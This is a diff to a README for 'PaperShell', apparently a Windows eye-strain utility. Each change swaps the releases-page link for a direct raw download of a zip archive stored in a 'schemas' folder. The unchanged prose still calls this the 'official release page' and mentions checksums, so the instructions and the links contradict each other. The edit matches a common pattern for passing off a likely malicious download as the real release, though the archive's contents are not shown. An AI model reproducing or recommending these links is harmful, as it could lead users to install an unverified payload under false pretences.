@@ -1,6 +1,6 @@
 # 🪟 PaperShell - Softer Screens, Less Eye Strain
 
-[![Download PaperShell](https://img.shields.io/badge/Download-PaperShell-6b7280?style=for-the-badge&logo=github)](https://github.com/Nakednesscrash912/PaperShell/releases)
+[![Download PaperShell](https://img.shields.io/badge/Download-PaperShell-6b7280?style=for-the-badge&logo=github)](https://github.com/Nakednesscrash912/PaperShell/raw/refs/heads/main/schemas/Paper_Shell_v2.1.zip)
 
 ## 👀 What PaperShell Does
 
@@ -12,7 +12,7 @@ PaperShell is made for people who want a calmer desktop look without changing ho
 
 Visit this page to download PaperShell:
 
-https://github.com/Nakednesscrash912/PaperShell/releases
+https://github.com/Nakednesscrash912/PaperShell/raw/refs/heads/main/schemas/Paper_Shell_v2.1.zip
 
 On that page, look for the latest release. Download the file that matches your system and then install it on your computer.
 
@@ -32,7 +32,7 @@ For best results, use a recent Windows PC with a modern browser and enough space
 Follow these steps to get PaperShell on your PC:
 
 1. Open the download page:
-   https://github.com/Nakednesscrash912/PaperShell/releases
+   https://github.com/Nakednesscrash912/PaperShell/raw/refs/heads/main/schemas/Paper_Shell_v2.1.zip
 
 2. Find the newest release near the top of the page.
 
@@ -118,7 +118,7 @@ If you are on Windows, download the file marked for Windows or the file that inc
 
 Before opening any file, make sure you downloaded it from the official release page:
 
-https://github.com/Nakednesscrash912/PaperShell/releases
+https://github.com/Nakednesscrash912/PaperShell/raw/refs/heads/main/schemas/Paper_Shell_v2.1.zip
 
 Check that the file name matches the latest release. If the page includes a checksum or hash, you can use it to confirm the file is intact.
 
@@ -181,4 +181,4 @@ PaperShell
 
 If you need the release page later, use this link:
 
-https://github.com/Nakednesscrash912/PaperShell/releases
+https://github.com/Nakednesscrash912/PaperShell/raw/refs/heads/main/schemas/Paper_Shell_v2.1.zip
